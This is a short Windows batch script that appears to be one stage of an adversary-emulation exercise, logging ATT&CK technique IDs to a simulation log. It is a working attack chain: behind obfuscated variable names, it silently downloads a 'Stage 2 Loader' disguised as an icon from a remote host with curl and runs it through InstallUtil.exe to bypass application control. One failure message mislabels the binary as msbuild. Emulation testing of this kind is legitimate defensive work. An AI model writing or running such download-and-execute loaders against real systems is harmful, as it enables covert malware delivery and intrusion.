@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Placeholder variable assignments (random names, PHR_ literals as values)
SET akjdhm=%APPDATA%\10429\3f82799a
SET qwzxpl=264b357e.txt
SET mnbvfg=https://10.0.0.49/stage/2/icon.png?10429-7
SET plkmjv=ITZEL-S2BO
SET vbnmcx=10429
SET ghzxpq=7

REM Additional random names for runtime variables
SET lkjhgf=%APPDATA%\!ghzxpq!\macula-simulations.log
SET poiuyt=!DATE!/!TIME!

REM Step 1: Heartbeat fetch (download Stage 2 Loader)
echo [!poiuyt!][DEBUG][!plkmjv!][!vbnmcx!]: heartbeat_start>> "!lkjhgf!" 2>nul
curl -k -s -o "!akjdhm!\!qwzxpl!" "!mnbvfg!"
echo [!poiuyt!][DEBUG][!plkmjv!][!vbnmcx!]: heartbeat_complete>> "!lkjhgf!" 2>nul

REM Step 2: Change working directory
echo [!poiuyt!][DEBUG][!plkmjv!][!vbnmcx!]: chdir_start>> "!lkjhgf!" 2>nul
cd /d "!akjdhm!"
echo [!poiuyt!][DEBUG][!plkmjv!][!vbnmcx!]: chdir_complete>> "!lkjhgf!" 2>nul

REM Step 3: Execute Stage 2 Loader via InstallUtil /U
echo [!poiuyt!][DEBUG][!plkmjv!][!vbnmcx!]: installutil_start>> "!lkjhgf!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U !qwzxpl! >NUL 2>&1
SET asdfgh=!ERRORLEVEL!
echo [!poiuyt!][DEBUG][!plkmjv!][!vbnmcx!]: installutil_complete>> "!lkjhgf!" 2>nul

REM TTP Logging - T1218 (System Binary Proxy Execution)
if !asdfgh! equ 0 (
    echo [!poiuyt!][TTP][!plkmjv!][!vbnmcx!]: T1218|System Binary Proxy Execution=[OK]:[]>> "!lkjhgf!" 2>nul
) else (
    echo [!poiuyt!][TTP][!plkmjv!][!vbnmcx!]: T1218|System Binary Proxy Execution=[FAIL]:[msbuild_failed]>> "!lkjhgf!" 2>nul
)

REM Step 4: Obfuscation applied to BAT (always OK)
echo [!poiuyt!][TTP][!plkmjv!][!vbnmcx!]: T1027|Obfuscated Files or Information=[OK]:[]>> "!lkjhgf!" 2>nul

REM Exit cleanly
exit /b 0